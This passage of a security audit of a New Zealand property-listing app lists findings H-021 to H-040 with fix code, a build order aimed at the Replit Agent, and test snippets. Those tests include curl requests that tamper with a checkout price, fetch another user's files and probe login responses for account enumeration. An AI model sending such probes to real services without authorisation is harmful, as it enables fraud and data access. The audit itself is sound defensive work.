const bytes = randomBytes(length);
password += chars[bytes[i] % chars.length];  // 256 % 70 = 46 — first 46 chars are over-represented
```

Not catastrophic (entropy still high enough that brute force isn't feasible) but it's a textbook bias. Either rejection-sample or use a larger source range.

**Fix.**

```ts
function generateSecurePassword(length: number = 16): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
  const out = [];
  while (out.length < length) {
    const buf = randomBytes(length * 2);
    for (let i = 0; i < buf.length && out.length < length; i++) {
      const x = buf[i];
      // Reject samples that would bias the modulo (256 - 256 % 70 = 256 - 46 = 210)
      if (x < 256 - (256 % chars.length)) {
        out.push(chars[x % chars.length]);
      }
    }
  }
  return out.join('');
}
```

Also bump default length from 12 to 16 for temporary admin/partner passwords.

---

### H-022 🟡 Partner login does not regenerate session ID

**File:** `server/partner-auth.ts:345–356`

**Problem.** Customer login regenerates the session ID after auth (auth.ts:339, prevents session fixation). Partner login does not — it just does `req.login(user, ...)`. Either match the customer pattern or document why partner sessions don't need it (they do).

**Fix.** Mirror the customer login flow:

```ts
req.login(user, (err) => {
  if (err) return res.status(500).json({ ... });
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ ... });
    req.login(user, (err) => {
      if (err) return res.status(500).json({ ... });
      res.json({ success: true, user: publicPartnerUser(user.partnerData) });  // also H-009
    });
  });
});
```

Also: there's no partner password-reset flow. Add one (mirror the customer flow with separate `partner_password_reset_tokens` table or reuse with a `userType` discriminator).

---

### H-023 🟡 Stripe events stored after processing, not in same transaction

**File:** `server/routes.ts:1781–1789`

**Problem.** Idempotency check happens before processing; insertion happens after. If the process crashes between the property update and the `stripeEvents` insert, the event will be reprocessed on Stripe's retry — and the property update will skip via the `paymentStatus === 'paid'` guard, which sounds OK, but transactions and purchase orders are inserted *before* the event row, so they'd be duplicated.

**Fix.** Wrap everything in a single transaction with the `stripeEvents` insert as the gating step:

```ts
try {
  await db.transaction(async (tx) => {
    // Insert event first; unique constraint on stripe_event_id throws if already processed.
    await tx.insert(stripeEvents).values({
      stripeEventId: event.id,
      eventType: event.type,
      payload: event,
      stripeCreated: new Date(event.created * 1000),
      livemode: event.livemode,
      account: event.account || null,
      processed: true,
    });

    // Now do all the writes (property update, transaction insert, purchase order, etc.)
    switch (event.type) { ... }
  });
} catch (err) {
  if (isUniqueViolation(err)) {
    // Already processed — idempotent, OK
    return res.status(200).json({ received: true, message: 'Already processed' });
  }
  throw err;
}
```

You also need `partnerUsers` insert and email send to be **outside** this transaction or wrapped in retry-safe idempotent logic, because emails can't be rolled back.

---

### H-024 🟡 Storage layer returns full user rows including `password`

**File:** `server/storage.ts:593–619`

**Problem.** `getUser`, `getUserByEmail`, `getUserByVerificationToken`, `getAllUsers` all `db.select().from(users)` — every column, including `password`. The auth `req.user` object therefore carries the password hash on every request. Routes that respond with `req.user` directly (or that derive responses without a strict allowlist) leak it.

The customer `/api/auth/user` endpoint (auth.ts:510) does the right thing — explicit field allowlist. But `getUser` consumers elsewhere are at risk.

**Fix.** Either:

- **Drizzle column allowlist on read paths**: `db.select({ id: users.id, email: users.email, ... }).from(users)`, with a separate `getUserForAuth` that returns the password for the verify step only.
- **Type-level safety**: define a `PublicUser = Omit<User, 'password' | 'emailVerificationToken' | 'emailVerificationExpiry'>` and use it everywhere except the password-verification site.

Audit pattern:

```bash
grep -rn "res\.json(.*user)" server/ | grep -v "publicUser\|allowlist"
```

Each result needs review.

---

### H-025 🟡 CSRF token random + not session-bound

**File:** `server/routes.ts:166–200, 285–294`

**Problem.** The double-submit cookie pattern works against external attackers (they can't read cookies cross-origin and can't set arbitrary headers cross-origin without CORS approval), but the implementation has two minor issues:

1. The CSRF token has no binding to the user's session, so a cross-tab attacker who can read the CSRF cookie via XSS in a *different* origin within the same registrable domain could reuse it.
2. `tokenFromCookie === tokenFromHeader` is not constant-time. Side-channel timing attacks against CSRF are theoretical here, but the fix is trivial.

**Fix.**

```ts
import { createHmac, timingSafeEqual } from 'crypto';

function signedCsrfToken(sessionId: string): string {
  const random = randomBytes(16).toString('hex');
  const sig = createHmac('sha256', process.env.SESSION_SECRET!)
    .update(`${sessionId}.${random}`)
    .digest('hex');
  return `${random}.${sig}`;
}
function verifyCsrf(token: string, sessionId: string): boolean {
  const [random, sig] = token.split('.');
  if (!random || !sig) return false;
  const expected = createHmac('sha256', process.env.SESSION_SECRET!)
    .update(`${sessionId}.${random}`)
    .digest('hex');
  const a = Buffer.from(sig, 'hex'), b = Buffer.from(expected, 'hex');
  return a.length === b.length && timingSafeEqual(a, b);
}
```

Then in `csrfProtection`, get `sessionId = req.sessionID` and call `verifyCsrf(tokenFromHeader, sessionId)`.

---

### H-026 🟡 `/admin/setup` is a public frontend route

**File:** `client/src/App.tsx:53`

**Problem.** Until you fix H-006, anyone hitting `/admin/setup` sees the form. After fixing H-006 (token-gated), the form should refuse to render unless the token is presented.

**Fix.** Either remove the route entirely (it's dev-time-only — invoke via curl when first deploying) or gate it on a query-string token that the page validates against `/api/admin/exists` and an env-var-derived check:

```tsx
// AdminSetup.tsx
const params = new URLSearchParams(location.search);
const token = params.get('token');
if (!token) return <NotFound />;
// then in form submit, send `x-admin-setup-token: token` header
```

---

### H-027 🟡 No 2FA for admin accounts

Accounts with `isAdmin: true` can drain costs, see all errors, manage partners, and run financial reports. A single password compromise = full takeover. Add TOTP-based 2FA *for admins only*, even if you don't roll it out to regular users.

Use `otplib` or `speakeasy` and store an encrypted `totp_secret` per admin. Enforce 2FA challenge after password verify in the login flow when `user.isAdmin === true`. Backup recovery codes (10, hashed, single-use).

---

### H-028 🟡 PII at rest is plaintext

**Files:** `shared/schema.ts:8, 381, 427–429, 1097–1099, 1344–1345, 1400`

`buyer_email`, `buyer_phone`, `customer_phone`, partner emails, etc. are all stored as plain text columns. For an MVP this is industry-standard. For a platform handling property offers (where the buyer's contact info has real value to scammers, doxxers, debt collectors, abusive ex-partners), consider:

- **Application-layer encryption** for `buyer_phone`, `customer_phone`, `lawyer_email`, `gst_number` using a key from a secret manager. Store as bytea + key version.
- At minimum, restrict who can SELECT these columns (separate Postgres role for the app vs admin-read).
- Document a data-classification policy in `SECURITY.md`.

This is a long-tail fix — flagging now so the schema can be evolved before too many rows accumulate.

---

### H-029 🟡 PII in console logs

**File:** `server/partner-auth.ts:262–263`, multiple in `routes.ts`

```ts
console.log("  - Phone:", partner.phone);
console.log("  - Company Email:", partner.email);
```

Replit deployment logs are persistent and accessible to anyone with workspace access. Treat them as a low-trust environment for PII.

**Fix.** Replace `console.log` with a structured logger (`pino` is small and fast) that supports redaction:

```ts
import pino from 'pino';
export const logger = pino({
  redact: {
    paths: ['*.password', '*.email', '*.phone', '*.token', 'req.headers.cookie', 'req.headers.authorization'],
    censor: '[REDACTED]',
  },
});
```

Then `logger.info({ partner }, 'Partner application submitted')` automatically redacts. Sentry already filters `cookie`/`authorization` headers but not request bodies.

---

### H-030 🟡 PDFs written to ephemeral filesystem

**File:** `server/routes.ts:2575–2580, 4567–4572`

`process.cwd()/generated_pdfs/` doesn't survive container restarts on Replit. Moving PDFs to Object Storage (per H-004) fixes this and the public-access issue together.

---

### H-031 🟡 Webhook secret falls back to `''`

**File:** `server/routes.ts:1567`

```ts
process.env.STRIPE_WEBHOOK_SECRET || ''
```

If the env var is unset in production, `constructEvent` will fail with a confusing "no signature" error rather than a clear "you forgot to set the secret" error. Throw at boot:

```ts
// at top of registerRoutes or in a startup-checks file
const REQUIRED_ENV = ['STRIPE_SECRET_KEY', 'STRIPE_WEBHOOK_SECRET', 'SESSION_SECRET', 'DATABASE_URL', 'PUBLIC_BASE_URL'];
if (process.env.NODE_ENV === 'production') {
  for (const v of REQUIRED_ENV) {
    if (!process.env[v]) throw new Error(`Required env var ${v} is not set`);
  }
}
```

---

### H-032 🟡 Profile picture regex is broken

**File:** `server/routes.ts:2383`

```ts
const emojiRegex = new RegExp('[\u{1F600}-\\u{1F64F}]|[\\u{1F300}-\\u{1F5FF}]|[\u{1F680}-\\u{1F6FF}]|[\\u{1F1E0}-\\u{1F1FF}]|[\\u{2600}-\u{26FF}]|[\u{2700}-\\u{27BF}]', 'u');
```

The mix of `\u{...}` and `\\u{...}` is inconsistent — when written as a string literal, `\u{...}` is interpreted by the JS string parser, but `\\u{...}` becomes a literal `\u{...}` character sequence inside the regex. This regex doesn't match the emoji ranges its author intended. Use a regex literal instead:

**Fix.**

```ts
const emojiRegex = /[\u{1F600}-\u{1F64F}\u{1F300}-\u{1F5FF}\u{1F680}-\u{1F6FF}\u{1F1E0}-\u{1F1FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/u;
```

(Or just use a small allowlist of permitted emojis — easier and less subtle.)

---

## 4. LOW / QUALITY FINDINGS

### H-033 🟢 Empty `server/middleware/`

`server/middleware/` exists but is empty, while `server/routes.ts` is **5,411 lines**. Refactor cross-cutting concerns into `server/middleware/`:

- `csrf.ts` — the CSRF middleware
- `rateLimits.ts` — auth / email / upload / global limiters
- `validate.ts` — Zod-validation helper
- `requireAuth.ts`, `requireAdmin.ts`, `requireOwnership.ts` — re-export from auth modules

Then split `routes.ts` into domain routers: `routes/properties.ts`, `routes/offers.ts`, `routes/payments.ts`, `routes/partners.ts`, `routes/admin.ts`. The current 5,411-line file is a maintenance hazard and a testing hazard — large files quietly accumulate the kinds of issues this audit found.

---

### H-034 🟢 No audit log table

For a system handling property listings, offers, and payments, you need an immutable audit trail. Add:

```sql
CREATE TABLE audit_log (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  actor_id varchar,
  actor_type text,            -- 'user', 'partner', 'admin', 'system', 'webhook'
  action text NOT NULL,       -- 'login.success', 'admin.invited', 'partner.verified', 'offer.created', 'property.activated', 'password.reset'
  target_type text,
  target_id varchar,
  ip_address text,
  user_agent text,
  metadata jsonb,
  created_at timestamp DEFAULT now()
);
```

Insert from key paths: every admin action, every payment fulfilment, every password reset, every partner verification, every offer state change. This is also what regulators look for.

---

### H-035 🟢 No request correlation ID

Add a tiny middleware:

```ts
import { randomUUID } from 'crypto';
app.use((req, res, next) => {
  const id = req.headers['x-request-id'] || randomUUID();
  (req as any).requestId = id;
  res.setHeader('x-request-id', id);
  next();
});
```

Pass `requestId` into your structured logger (H-029) so every log line and every Sentry event carries it. Massively easier to debug Stripe webhooks and AI failures.

---

### H-036 🟢 No GDPR / NZ Privacy Act 2020 user-data endpoints

You need at minimum:
- `GET /api/users/me/data-export` — returns all PII the system holds about the user (offers, swipes, properties, profile) as a JSON or ZIP.
- `POST /api/users/me/delete` — initiates account deletion (soft-delete with a 30-day grace, then anonymise PII columns).
- `/privacy` page documenting what's stored, why, and for how long.

NZ Privacy Act 2020 gives users the right to access and correct their personal information. These endpoints make compliance trivial — without them, every request is a manual support task.

---

### H-037 🟢 Verify `dangerouslySetInnerHTML` is always sanitised

**Files:** `client/src/components/ui/chart.tsx:81`, `client/src/components/draft-viewer-modal.tsx:142`

The draft-viewer modal already uses `sanitizeLegalDocument`. The chart component uses inline-style injection, which is generally safe but worth a double-check that no user-controlled data flows into it.

Search every `dangerouslySetInnerHTML` and confirm input sanitisation:

```bash
grep -rn "dangerouslySetInnerHTML" client/src/
```

---

### H-038 🟢 No `security.txt` / vulnerability disclosure policy

Add `client/public/.well-known/security.txt`:

```
Contact: mailto:security@harikoa-kainga.nz
Expires: 2027-01-01T00:00:00.000Z
Preferred-Languages: en
Canonical: https://housematch.nz/.well-known/security.txt
Policy: https://housematch.nz/security
```

It costs nothing and lets a researcher tell you about a bug instead of selling it.

---

### H-039 🟢 Missing security headers, no SRI on CDN scripts

Helmet sets HSTS, X-Content-Type-Options, etc. Consider adding:

- `Cross-Origin-Opener-Policy: same-origin` (already set by Helmet defaults? Verify.)
- `Cross-Origin-Embedder-Policy: require-corp` if you don't need third-party iframes
- `Cross-Origin-Resource-Policy: same-site`
- `frame-ancestors 'none'` in CSP (replaces `X-Frame-Options: DENY`)

Where you load Font Awesome from `cdnjs.cloudflare.com` (CSP allowlist confirms this), add Subresource Integrity:

```html
<link rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      integrity="sha384-iw3OoTErCYJJB9mCa8LNS2hbsQ7M3C0EpIsO/H5+EGAkPGc6rk+V8i04oW/K5xq0"
      crossorigin="anonymous">
```

(use the actual hash — don't copy that one, it's an example).

---

### H-040 🟢 Partner onboarding has no status page

Flow today: partner signs up → admin reviews (email) → admin verifies (in `/admin/partners`) → if "preferred client", system sends Stripe payment link via email → partner pays → webhook activates → email with credentials. From the partner's side, after submitting the signup form, they get a single confirmation page and then nothing until the credentials email arrives — could be days.

Add a status-tracking page: when partner signup succeeds, return a `partnerId` and email a link to `/partner/status/<partnerId>?token=<short-lived-jwt>` that shows: "Pending review", "Approved — payment link sent", "Active". This dramatically reduces support load.

---

## 5. UX & Flow Audit (the "transition between areas" you asked about)

These aren't security issues but they affect how easy it is to move between sections and complete the core jobs.

| Area | Issue | Recommendation |
|---|---|---|
| Home → Like → My Offers | Liked properties screen and My Offers are separate routes; user has to remember which is which | Single "My Activity" page with tabs: Liked / Offers / Reports / Saved |
| Add Property → Pay → Active | Two flows (old "create after pay" + new "create then activate") still both wired in `routes.ts:3563` | Pick one; remove the other. Old flow is also more error-prone (no draft saved if user abandons). |
| Reports → Buy → Where's my report? | Title search has 2-business-day delay (prod), no in-app status. User has to wait for email. | Add a "My Reports" tab with status: Pending / Processing / Ready (download). Reuse `purchaseOrders.status` field. |
| Offer Wizard | Phase 1 / Phase 2 / Phase 3 split — multi-step wizards on properties hint at saved drafts but resume UX needs verification | Confirm `getDraftOfferForProperty` resumes seamlessly; add a "Continue offer" CTA on property detail when a draft exists |
| Partner onboarding | See H-040 above | Status page + email updates |
| Admin → Partner verify | Admin verifies, system creates partner credentials and emails them | Show partner the "you've been approved" page on first login with a "set your real password" forced step (also fixes H-007 / H-022 pattern) |
| Login → Partner Login confusion | Two login pages (`/` and `/partner/login`) with cross-redirects via `EMAIL_NOT_FOUND` / `PARTNER_ACCOUNT_DETECTED` | After fixing H-010 (no enumeration), use a single `/login` page that lets the user choose "I'm a buyer/seller" vs "I'm a service partner" before entering email. The system then routes the auth attempt to the right table. |
| `/admin/setup` | Public frontend route shows the form to anyone | See H-026 |
| Reset password | After success, just redirects to login. No "all your sessions have been signed out" message. | Add it (also drives H-012 fix) |
| Logout from admin | `requireAdmin` guards routes, but no clear "Sign out as admin" pattern when admin also has a regular user account | Decide: single account that is or isn't admin (current model), or separate admin login. Document. |

---

## 6. Stripe Flow Specifically (you asked)

You have **three** Stripe payment paths in this codebase:

1. **Listing payment** — `POST /api/stripe/create-checkout-session` with `planType='listing'` → user pays → property activated.
2. **Report/service payment** — same endpoint with `planType='report'` or `planType='service'` → user pays → purchase order created.
3. **Subscription payment** — `POST /api/subscription/create-checkout` (premium) and `POST /api/partners/:id/pay` (partner preferred-client subscription) → user pays → subscription record updated.

Each path currently has bugs:

| Path | Bug | Finding |
|---|---|---|
| All | Webhook signature broken; everything currently relies on success URL | H-001 |
| Report/service | Price comes from client | H-002 |
| Listing & Report | Success URL endpoint has no auth | H-013 |
| Listing | Two activation paths race | H-014 |
| Subscription | Same webhook signature bug | H-001 |
| All | Success/cancel URLs fall back to localhost in prod | H-018 |
| All | `STRIPE_WEBHOOK_SECRET` falls back to empty string | H-031 |

**Recommended target architecture:**

```
┌─────────────┐    POST /api/stripe/create-checkout-session
│   Browser   │───────────────────────────────────────▶  Server (validates plan, prices it server-side, creates Stripe session, stores propertyPaymentSession with status=pending)
└─────────────┘
       │
       │  redirect to Stripe Checkout (hosted)
       ▼
┌─────────────┐
│   Stripe    │
└─────────────┘
       │                                                    ┌──────────────────────────┐
       ├── webhook ─────────────────────────────────────────▶│  POST /api/webhooks/     │
       │     (single source of truth for fulfilment)        │  stripe                  │  ←── verifies signature
       │                                                    │                          │  ←── inserts stripeEvents (idempotent)
       │                                                    │                          │  ←── activates property / creates PO / records txn
       │                                                    └──────────────────────────┘
       │
       │  redirect user to /payment-success?session_id=...
       ▼
┌─────────────┐    GET /api/stripe/payment-success?session_id=...
│   Browser   │───────────────────────────────────────▶  Server (READ-ONLY: looks up session, returns status)
└─────────────┘                                            If status=pending, frontend polls. If completed, shows confirmation.
```

The fixes for H-001, H-002, H-013, H-014, H-018, H-023, H-031 collectively give you this architecture.

---

## 7. Recommended Build Order (for Replit Agent)

Do these in order — later fixes depend on earlier ones.

**Phase 1 — Critical, payment-related (do as one PR):**
1. H-001 (webhook body parser order)
2. H-002 (server-side report pricing)
3. H-013 + H-014 (read-only success URL, single fulfilment path)
4. H-023 (transactional event insert)
5. H-018 (canonical `getPublicBaseUrl()`)
6. H-031 (require env vars at boot)

**Phase 2 — Critical, identity-related:**
7. H-005 (re-enable email verification)
8. H-006 (lock down `/api/admin/setup`)
9. H-007 (admin invite — email passwords, never return them)
10. H-008 (delete password console.log lines)
11. H-009 (strip password hash from partner login response)
12. H-024 (`PublicUser` type, audit `res.json(user)` sites)
13. H-010 (uniform login error responses)

**Phase 3 — Critical, file-related:**
14. H-003 (ACL check on `/objects/:objectPath`)
15. H-004 (move PDFs to object storage; remove static mount)
16. H-015 (auth on `/api/property-images` and `/api/service-providers`)
17. H-017 (post-upload MIME / size validation)

**Phase 4 — High, hygiene:**
18. H-011 + H-012 (centralised password policy, session invalidation on reset)
19. H-016 (CSRF on auth endpoints — also implies refactor in H-033)
20. H-019 + H-020 (body limits, tightened CSP)

**Phase 5 — Medium / structural:**
21. H-021 (unbiased password generator)
22. H-022 (partner session regenerate, partner password reset)
23. H-025 (HMAC-bound CSRF token)
24. H-026 (private `/admin/setup` route)
25. H-029 (structured logger with redaction)
26. H-032 (fix emoji regex)
27. H-033 (extract `server/middleware/`, split `routes.ts`)
28. H-035 (request correlation ID)

**Phase 6 — Low / compliance:**
29. H-027 (admin 2FA)
30. H-028 (PII at rest plan)
31. H-034 (audit log table)
32. H-036 (data-export / data-delete endpoints)
33. H-037 (XSS audit pass)
34. H-038 (security.txt)
35. H-039 (extra security headers + SRI)
36. H-040 (partner status page)

---

## 8. What's Already Good (don't break these)

So the agent doesn't accidentally regress good work:

- ✅ scrypt for password hashing (`auth.ts:30–41, partner-auth.ts:27–38`) — keep parameters as-is.
- ✅ `timingSafeEqual` for password comparison.
- ✅ Drizzle ORM throughout — kills SQL injection by default.
- ✅ Zod validation for offers and properties.
- ✅ `requireAuth`, `requireAdmin`, `requirePartnerAuth`, `requirePropertyOwnership` middleware exist and are largely correctly applied (per the existing audit doc).
- ✅ Rate limiters at multiple layers (global, auth, email, upload).
- ✅ Helmet is wired, with HSTS, nonce-based CSP scaffolding (just needs tightening per H-020).
- ✅ Session cookie is `httpOnly`, `secure` in prod, `sameSite: 'lax'`.
- ✅ Property data is **copied at offer time** to prevent later tampering (`routes.ts:2557–2562`) — good legal-integrity decision.
- ✅ Offer ownership check on `getPropertyOffer` (`routes.ts:4234–4239`).
- ✅ Stripe webhook idempotency table (`stripeEvents`) exists and is queried — just needs to be inside the transaction (H-023).
- ✅ Customer login regenerates session ID — fixation-resistant.
- ✅ `forgot-password` correctly does NOT reveal account existence — match this in `login` (H-010).
- ✅ `trust proxy: 1` is set, so rate limiters see real client IPs behind Replit's proxy.
- ✅ Sentry filters auth/cookie headers from request context.
- ✅ Object ACL primitives (`objectAcl.ts`) are well-designed — the issue is just that `canAccessObjectEntity` isn't *called* on the download path (H-003).

---

## 9. Appendix — Quick Test Snippets

**Test H-001 (webhook signature):**
```bash
stripe listen --forward-to localhost:5000/api/webhooks/stripe/subscription
stripe trigger checkout.session.completed
# Expect: ✅ Event evt_... stored. NOT: ❌ Webhook signature verification failed.
```

**Test H-002 (price tampering):**
```bash
curl -X POST localhost:5000/api/stripe/create-checkout-session \
  -H 'Content-Type: application/json' -H 'Cookie: connect.sid=...' \
  -H 'x-csrf-token: ...' \
  -d '{"planType":"report","planId":"title-search","metadata":{"price":1,"name":"Cheap"}}'
# Expect: Stripe session amount_total = 1900 (the configured price), NOT 1.
```

**Test H-003 (object ACL):**
```bash
# As user A, upload a file, get URL like /objects/uploads/abc-123
# Log in as user B:
curl -i localhost:5000/objects/uploads/abc-123 -H 'Cookie: <user-B-session>'
# Expect: 403, NOT the file contents.
```

**Test H-004 (offer PDF):**
```bash
# After fix, with no auth cookie:
curl -i localhost:5000/generated_pdfs/express-interest-anything.pdf
# Expect: 404 (route removed). And:
curl -i localhost:5000/api/offers/<other-users-offer-id>/pdf -H 'Cookie: <my-session>'
# Expect: 403.
```

**Test H-010 (enumeration):**
```bash
for email in real@x.com fake@x.com partner@x.com; do
  curl -s -X POST localhost:5000/api/auth/login \
    -H 'Content-Type: application/json' -H 'x-csrf-token: ...' \
    -d "{\"email\":\"$email\",\"password\":\"x\"}"
  echo
done
# Expect: 3 byte-identical responses.
```

**Test H-013 (payment-success no-auth):**
```bash
# After fix, with no auth cookie:
curl -i 'localhost:5000/api/stripe/payment-success?session_id=cs_test_123'
# Expect: 401 Authentication required, NOT property activation.
```

---

**End of audit.** Total findings: **40**. Critical: **10**. High: **10**. Medium: **12**. Low: **8**.

This document is intended to be ingested as-is by the Replit Agent. Each finding has a stable ID, file:line references, a concrete fix, and a verification step. Work through Sections 7's build order top-to-bottom.
